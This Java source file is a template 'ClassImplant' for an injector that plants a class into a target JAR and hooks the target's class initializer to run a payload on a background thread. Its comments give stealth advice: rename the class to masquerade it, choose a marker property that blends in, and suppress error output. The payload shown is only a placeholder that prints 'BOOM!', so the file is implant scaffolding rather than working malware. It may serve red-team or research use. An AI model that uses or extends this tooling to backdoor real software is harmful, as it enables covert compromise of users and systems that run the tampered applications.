package org.example.implants;

/**
 * Template class for the ClassInjector.
 * <p>Feel free to copy this into a new custom implant class and modify it. Normally in Java, this would be an abstract
 * super class for you to extend in your own class. This common design practice will be avoided here because it would
 * complicate the injection process. Having everything in one big class requires only one class file to be injected into
 * the target JAR, thus making the implant a bit less obvious and more simple. The downside is that the code for
 * implants may be a bit more involved to maintain - a small price to pay for a more stealthy and robust implant.</p>
 * <p>Also feel free to add any static field beginning with CONF_* to add your own config properties for the implant.
 * These will be picked up by the injector and hardcoded into the class file's const pool.</p>
 * <p>If you don't want to bother with creating new files and stuff, then you may also just add your code to this
 * template class, recompile the project and use it with the ClassInjector.</p>
 * <p>Also note that this class will be renamed to something else during the injection process in order to masquerade
 * it slightly.</p>
 */
public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
    /**
     * JVM system property to create and use as a "marker" to determine if an implant has been detonated in this JVM.
     * This property name could be anything that does not already naturally exist in the JVM. Just make it blend in.
     */
    static final String CONF_JVM_MARKER_PROP = "java.class.init";

    /**
     * Controls whether the implant's thread will block the JVM from fully exiting until the implant is done.
     * <p>Set this to 'true' if you absolutely require the implant to fully finnish running before the JVM shuts down.
     * Take great care when setting this to 'true'! If the implant payload code blocks, sleeps or performs long-running
     * operations, then this will block the JVM from shutting down properly as the target app normally shuts down.
     * In other words: Only set this to 'true' if your implant payload does something quick and it _needs_ to be done
     * in full. Don't set this to 'true' if the implant payload listens for connections or waits for something to
     * happen. However, *do* set this to 'true' if you want the payload to always finish what it's doing.</p>
     * <p>Essentially, setting this to 'false' makes the implant background thread a "daemon thread". This means that
     * the JVM will not wait for it when all regular threads (like the main thread) are done.</p>
     */
    static final boolean CONF_BLOCK_JVM_SHUTDOWN = false;

    /**
     * Optional delay (in milliseconds) before the implant payload will detonate.
     * This can be used in combination with CONF_BLOCK_JVM_SHUTDOWN in order to only run the payload when the app is a
     * long-running one (like a service). Just set it to '0' in order to run the payload asap.
     * DO NOT set a delay and CONF_BLOCK_JVM_SHUTDOWN to 'true' unless you want to risk delaying the JVM from shutting
     * down properly.
     */
    static final int CONF_DELAY_MS = 0;

    /**
     * The entry point in this implant class.
     * <p>The ClassInjector will copy this method to the target and modify the target's class initializer function
     * to invoke this method.</p>
     * <p>You probably don't want to modify this method.</p>
     */
    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                ClassImplant implant = new ClassImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    /**
     * Entry point for the background thread.
     * <p>This is the place to put your own payload code.</p>
     */
    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        // ---------- BEGIN PAYLOAD CODE HERE ----------
        System.out.println("BOOM!");

    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }
}
